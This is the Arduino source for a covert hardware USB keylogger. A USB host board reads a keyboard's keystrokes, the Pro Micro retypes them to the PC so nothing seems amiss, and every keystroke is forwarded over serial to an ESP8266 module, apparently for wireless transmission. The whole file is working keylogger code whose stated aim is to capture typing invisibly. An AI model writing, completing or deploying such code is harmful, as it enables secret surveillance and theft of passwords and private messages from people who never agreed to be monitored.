// make sure to copy whole folder, not just this sketch

#include <SoftwareSerial.h>             // library required for serial communication using almost(!) any Digital I/O pins of Arduino
#include <Keyboard.h>                   // library that contains all the HID functionality necessary to pass-on the typed and logged keys to the PC
#include "C_USBhost.h"                  // class used to make the code more clear

SoftwareSerial Esp8266(16, 15); // CJMCU - MO(16), SCK(15) 
C_USBhost USBhost = C_USBhost(Serial1, /*debug_state*/false);            // communication with USB host board (receiving input from keyboard), connected to RX/TX of Arduino Pro Micro

/*    
    [ CJMCU Beetle   ->   Usb Host Mini Board ]   // Vertical lines indicate that the connection is made on the same module
              GND    ->    0V (GND)
                              |
                         4.7K resistor
                              |
                             RX
                             
              RX    ->    TX
              TX    ->    2K resistor -> RX
              5V    ->    5V   

*/

#define BAUD_RATE_ESP8266 57600                      // default was 9600 
#define BAUD_RATE_USB_HOST_BOARD 115200              // default was 9600
#define BAUD_RATE_SERIAL 115200                     

void setup() {
  delay(1000);                                                // probably useless, but it allows some time for the USB host board and Sim800L to initialize 
  Serial.begin(BAUD_RATE_SERIAL);                             // begin serial communication with PC (so Serial Monitor could be opened and the developer could see what is actually going on in the code)                          
  Esp8266.begin(BAUD_RATE_ESP8266);
  USBhost.Begin(BAUD_RATE_USB_HOST_BOARD);                    // begin serial communication with USB host board in order to receive key bytes from the keyboard connected to it
  USBhost.SetMode('6');
  Keyboard.begin();                                           // start HID functionality, it will allow to type keys to the PC just as if there was no keylogger at all
}

void loop() {
  byte b = USBhost.GetKey();                                  // function responsible for collecting, storing keystrokes from USB host board, it also is typing keystrokes to PC (shouldn't be in fact called GetKey...)
  if(b){
    Esp8266.print(char(b));
  }
}

